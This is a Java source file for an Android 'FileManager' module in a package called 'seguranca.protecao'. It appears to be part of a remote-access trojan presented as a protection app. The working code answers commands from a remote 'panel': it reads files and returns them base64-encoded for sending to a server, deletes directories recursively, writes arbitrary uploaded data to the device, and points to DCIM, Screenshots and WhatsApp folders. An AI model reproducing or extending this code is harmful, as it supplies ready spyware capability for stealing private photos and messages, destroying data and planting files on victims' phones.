package com.seguranca.protecao;

import android.content.Context;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;

/**
 * FileManager — complete file system feature set.
 *
 * Features:
 *  - browseFiles()     BROWSE_FILES
 *  - downloadFile()    DOWNLOAD_FILE   (base64 content to server)
 *  - deleteFile()      DELETE_FILE
 *  - renameFile()      RENAME_FILE
 *  - createDir()       CREATE_DIR
 *  - moveFile()        MOVE_FILE
 *  - copyFile()        COPY_FILE
 *  - getFileInfo()     GET_FILE_INFO
 *  - searchFiles()     SEARCH_FILES
 *  - writeFile()       WRITE_FILE / UPLOAD_FILE  (write data to device)
 *  - getStorageInfo()  GET_STORAGE_INFO
 *  - getFavorites()    GET_FAV_DIRS   (quick access to Photos, Downloads, DCIM, etc.)
 */
public class FileManager {

    private static final String TAG = "FileManager";
    private static final long MAX_DOWNLOAD_BYTES = 25 * 1024 * 1024L; // 25 MB cap
    private final SimpleDateFormat sdf =
            new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
    private final Context ctx;

    public FileManager(Context ctx) {
        this.ctx = ctx;
    }

    // ─── BROWSE FILES ────────────────────────────────────────────────────────

    /**
     * Lists directory contents. Returns JSON: {path, items:[{name,isDir,size,date,ext}]}
     */
    public String browseFiles(String path) {
        if (path == null || path.isEmpty()) {
            path = Environment.getExternalStorageDirectory().getAbsolutePath();
        }

        JsonObject result = new JsonObject();
        try {
            File dir = new File(path);
            if (!dir.exists()) return error("Path not found: " + path);
            if (!dir.isDirectory()) return error("Not a directory: " + path);

            result.addProperty("path",    dir.getAbsolutePath());
            result.addProperty("parent",  dir.getParent() != null ? dir.getParent() : "");

            // Free space
            result.addProperty("free_bytes",  dir.getFreeSpace());
            result.addProperty("total_bytes", dir.getTotalSpace());

            File[] files = dir.listFiles();
            JsonArray items = new JsonArray();
            if (files != null) {
                // Sort: dirs first, then files, both alphabetical
                Arrays.sort(files, (a, b) -> {
                    if (a.isDirectory() && !b.isDirectory()) return -1;
                    if (!a.isDirectory() && b.isDirectory()) return 1;
                    return a.getName().compareToIgnoreCase(b.getName());
                });

                for (File f : files) {
                    try {
                        JsonObject item = new JsonObject();
                        item.addProperty("name",     f.getName());
                        item.addProperty("path",     f.getAbsolutePath());
                        item.addProperty("isDir",    f.isDirectory());
                        item.addProperty("size",     f.length());
                        item.addProperty("size_fmt", formatSize(f.length()));
                        item.addProperty("date",     f.lastModified());
                        item.addProperty("date_str", sdf.format(new Date(f.lastModified())));
                        item.addProperty("hidden",   f.getName().startsWith("."));
                        item.addProperty("readable", f.canRead());
                        item.addProperty("writable", f.canWrite());
                        if (!f.isDirectory()) {
                            item.addProperty("ext", getExt(f.getName()));
                        }
                        items.add(item);
                    } catch (Exception ignored) {}
                }
            }
            result.add("items", items);
            result.addProperty("count", items.size());
        } catch (Exception e) {
            Log.e(TAG, "browseFiles: " + e.getMessage());
            return error(e.getMessage());
        }
        return result.toString();
    }

    // ─── DOWNLOAD FILE ───────────────────────────────────────────────────────

    /**
     * Reads a file from disk and returns it as base64.
     * Used by the panel to download files from the device.
     * Returns: {name, path, size, base64, mime}
     */
    public String downloadFile(String path) {
        if (path == null || path.isEmpty()) return error("path required");
        try {
            File f = new File(path);
            if (!f.exists())   return error("File not found: " + path);
            if (!f.isFile())   return error("Not a file: " + path);
            if (!f.canRead())  return error("Permission denied: " + path);
            if (f.length() > MAX_DOWNLOAD_BYTES)
                return error("File too large (" + formatSize(f.length()) + " > 25MB)");

            byte[] data = new byte[(int) f.length()];
            try (FileInputStream fis = new FileInputStream(f)) {
                int totalRead = 0;
                while (totalRead < data.length) {
                    int read = fis.read(data, totalRead, data.length - totalRead);
                    if (read == -1) break;
                    totalRead += read;
                }
            }

            JsonObject obj = new JsonObject();
            obj.addProperty("name",   f.getName());
            obj.addProperty("path",   f.getAbsolutePath());
            obj.addProperty("size",   f.length());
            obj.addProperty("size_fmt", formatSize(f.length()));
            obj.addProperty("date",   f.lastModified());
            obj.addProperty("mime",   getMime(f.getName()));
            obj.addProperty("base64", Base64.encodeToString(data, Base64.NO_WRAP));
            return obj.toString();
        } catch (Exception e) {
            Log.e(TAG, "downloadFile: " + e.getMessage());
            return error(e.getMessage());
        }
    }

    // ─── DELETE FILE ─────────────────────────────────────────────────────────

    /**
     * Deletes a file or recursively deletes a directory.
     */
    public String deleteFile(String path) {
        if (path == null || path.isEmpty()) return error("path required");
        try {
            File f = new File(path);
            if (!f.exists()) return error("Not found: " + path);
            boolean ok = deleteRecursive(f);
            return ok ? "OK: deleted " + path : error("Failed to delete " + path);
        } catch (Exception e) {
            return error(e.getMessage());
        }
    }

    private boolean deleteRecursive(File f) {
        if (f.isDirectory()) {
            File[] children = f.listFiles();
            if (children != null) {
                for (File c : children) deleteRecursive(c);
            }
        }
        return f.delete();
    }

    // ─── RENAME FILE ─────────────────────────────────────────────────────────

    public String renameFile(String path, String newName) {
        if (path == null || path.isEmpty())    return error("path required");
        if (newName == null || newName.isEmpty()) return error("newName required");
        try {
            File src = new File(path);
            if (!src.exists()) return error("Not found: " + path);
            File dst = new File(src.getParent(), newName);
            if (dst.exists()) return error("Destination already exists: " + dst.getAbsolutePath());
            boolean ok = src.renameTo(dst);
            return ok ? "OK: renamed to " + dst.getAbsolutePath() : error("Rename failed");
        } catch (Exception e) {
            return error(e.getMessage());
        }
    }

    // ─── MOVE FILE ───────────────────────────────────────────────────────────

    public String moveFile(String src, String dst) {
        if (src == null || src.isEmpty()) return error("src required");
        if (dst == null || dst.isEmpty()) return error("dst required");
        try {
            File srcFile = new File(src);
            File dstFile = new File(dst);
            if (!srcFile.exists()) return error("Source not found: " + src);
            if (srcFile.renameTo(dstFile)) return "OK: moved to " + dst;
            // Cross-device move: copy then delete
            copyFileInternal(srcFile, dstFile);
            srcFile.delete();
            return "OK: moved (cross-device) to " + dst;
        } catch (Exception e) {
            return error(e.getMessage());
        }
    }

    // ─── COPY FILE ───────────────────────────────────────────────────────────

    public String copyFile(String src, String dst) {
        if (src == null || src.isEmpty()) return error("src required");
        if (dst == null || dst.isEmpty()) return error("dst required");
        try {
            File srcFile = new File(src);
            File dstFile = new File(dst);
            if (!srcFile.exists()) return error("Source not found: " + src);
            copyFileInternal(srcFile, dstFile);
            return "OK: copied to " + dst;
        } catch (Exception e) {
            return error(e.getMessage());
        }
    }

    private void copyFileInternal(File src, File dst) throws IOException {
        if (dst.getParentFile() != null) dst.getParentFile().mkdirs();
        try (FileInputStream in = new FileInputStream(src);
             FileOutputStream out = new FileOutputStream(dst)) {
            byte[] buf = new byte[65536];
            int n;
            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        }
    }

    // ─── CREATE DIRECTORY ────────────────────────────────────────────────────

    public String createDir(String path) {
        if (path == null || path.isEmpty()) return error("path required");
        try {
            File dir = new File(path);
            if (dir.exists()) return dir.isDirectory() ? "OK: already exists" : error("A file exists at that path");
            boolean ok = dir.mkdirs();
            return ok ? "OK: created " + path : error("Could not create directory");
        } catch (Exception e) {
            return error(e.getMessage());
        }
    }

    // ─── WRITE FILE (UPLOAD) ─────────────────────────────────────────────────

    /**
     * Writes base64-encoded data to a path on the device.
     */
    public String writeFile(String path, String base64Data) {
        if (path == null || path.isEmpty())    return error("path required");
        if (base64Data == null || base64Data.isEmpty()) return error("data required");
        try {
            byte[] data = Base64.decode(base64Data, Base64.DEFAULT);
            File f = new File(path);
            if (f.getParentFile() != null) f.getParentFile().mkdirs();
            try (FileOutputStream fos = new FileOutputStream(f)) {
                fos.write(data);
            }
            return "OK: written " + formatSize(data.length) + " to " + path;
        } catch (Exception e) {
            return error(e.getMessage());
        }
    }

    // ─── GET FILE INFO ───────────────────────────────────────────────────────

    public String getFileInfo(String path) {
        if (path == null || path.isEmpty()) return error("path required");
        try {
            File f = new File(path);
            JsonObject obj = new JsonObject();
            obj.addProperty("name",     f.getName());
            obj.addProperty("path",     f.getAbsolutePath());
            obj.addProperty("exists",   f.exists());
            obj.addProperty("isDir",    f.isDirectory());
            obj.addProperty("size",     f.length());
            obj.addProperty("size_fmt", formatSize(f.length()));
            obj.addProperty("date",     f.lastModified());
            obj.addProperty("date_str", sdf.format(new Date(f.lastModified())));
            obj.addProperty("readable", f.canRead());
            obj.addProperty("writable", f.canWrite());
            obj.addProperty("hidden",   f.isHidden());
            obj.addProperty("ext",      getExt(f.getName()));
            obj.addProperty("mime",     getMime(f.getName()));
            if (f.isDirectory()) {
                File[] children = f.listFiles();
                obj.addProperty("children", children != null ? children.length : 0);
            }
            return obj.toString();
        } catch (Exception e) {
            return error(e.getMessage());
        }
    }

    // ─── SEARCH FILES ────────────────────────────────────────────────────────

    /**
     * Recursively searches for files matching a name pattern, starting from root.
     */
    public String searchFiles(String query, String startPath) {
        if (query == null || query.isEmpty()) return error("query required");
        if (startPath == null || startPath.isEmpty()) {
            startPath = Environment.getExternalStorageDirectory().getAbsolutePath();
        }
        JsonArray arr = new JsonArray();
        try {
            searchRecursive(new File(startPath), query.toLowerCase(), arr, 0);
        } catch (Exception e) {
            Log.e(TAG, "searchFiles: " + e.getMessage());
        }
        return arr.toString();
    }

    private void searchRecursive(File dir, String query, JsonArray results, int depth) {
        if (depth > 8 || results.size() > 200) return;
        try {
            File[] files = dir.listFiles();
            if (files == null) return;
            for (File f : files) {
                if (f.getName().toLowerCase().contains(query)) {
                    JsonObject obj = new JsonObject();
                    obj.addProperty("name",     f.getName());
                    obj.addProperty("path",     f.getAbsolutePath());
                    obj.addProperty("isDir",    f.isDirectory());
                    obj.addProperty("size",     f.length());
                    obj.addProperty("size_fmt", formatSize(f.length()));
                    results.add(obj);
                }
                if (f.isDirectory()) {
                    searchRecursive(f, query, results, depth + 1);
                }
            }
        } catch (Exception ignored) {}
    }

    // ─── STORAGE INFO ────────────────────────────────────────────────────────

    public String getStorageInfo() {
        JsonObject obj = new JsonObject();
        try {
            File ext = Environment.getExternalStorageDirectory();
            obj.addProperty("external_total",  ext.getTotalSpace());
            obj.addProperty("external_free",   ext.getFreeSpace());
            obj.addProperty("external_used",   ext.getTotalSpace() - ext.getFreeSpace());
            obj.addProperty("external_total_fmt", formatSize(ext.getTotalSpace()));
            obj.addProperty("external_free_fmt",  formatSize(ext.getFreeSpace()));

            File internal = ctx.getFilesDir();
            obj.addProperty("internal_total", internal.getTotalSpace());
            obj.addProperty("internal_free",  internal.getFreeSpace());
            obj.addProperty("internal_total_fmt", formatSize(internal.getTotalSpace()));
            obj.addProperty("internal_free_fmt",  formatSize(internal.getFreeSpace()));

            obj.addProperty("external_path", ext.getAbsolutePath());
            obj.addProperty("state", Environment.getExternalStorageState());
        } catch (Exception e) {
            obj.addProperty("error", e.getMessage());
        }
        return obj.toString();
    }

    // ─── FAVORITE DIRECTORIES ────────────────────────────────────────────────

    /**
     * Returns a JSON array of common useful directories with their paths.
     */
    public String getFavoriteDirs() {
        JsonArray arr = new JsonArray();
        String[][] favs = {
            {"📷 DCIM",       Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath()},
            {"🖼 Pictures",   Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getAbsolutePath()},
            {"⬇ Downloads",  Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath()},
            {"🎵 Music",      Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC).getAbsolutePath()},
            {"🎬 Movies",     Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES).getAbsolutePath()},
            {"📁 Documents",  Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS).getAbsolutePath()},
            {"📂 Root",       Environment.getExternalStorageDirectory().getAbsolutePath()},
            {"🗂 WhatsApp",   Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp"},
            {"📸 Screenshots",Environment.getExternalStorageDirectory().getAbsolutePath() + "/Pictures/Screenshots"},
        };
        for (String[] fav : favs) {
            JsonObject obj = new JsonObject();
            obj.addProperty("label", fav[0]);
            obj.addProperty("path",  fav[1]);
            obj.addProperty("exists", new File(fav[1]).exists());
            arr.add(obj);
        }
        return arr.toString();
    }

    // ─── HELPERS ─────────────────────────────────────────────────────────────

    private String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return String.format(Locale.US, "%.1f KB", bytes / 1024.0);
        if (bytes < 1024L * 1024 * 1024) return String.format(Locale.US, "%.1f MB", bytes / (1024.0 * 1024));
        return String.format(Locale.US, "%.2f GB", bytes / (1024.0 * 1024 * 1024));
    }

    private String getExt(String name) {
        if (name == null) return "";
        int i = name.lastIndexOf('.');
        return i >= 0 ? name.substring(i + 1).toLowerCase() : "";
    }

    private String getMime(String name) {
        String ext = getExt(name);
        switch (ext) {
            case "jpg": case "jpeg": return "image/jpeg";
            case "png":  return "image/png";
            case "gif":  return "image/gif";
            case "webp": return "image/webp";
            case "mp4":  return "video/mp4";
            case "mp3":  return "audio/mpeg";
            case "pdf":  return "application/pdf";
            case "apk":  return "application/vnd.android.package-archive";
            case "txt":  return "text/plain";
            case "json": return "application/json";
            case "zip":  return "application/zip";
            default:     return "application/octet-stream";
        }
    }

    private String error(String msg) {
        JsonObject obj = new JsonObject();
        obj.addProperty("error", msg);
        return obj.toString();
    }
}
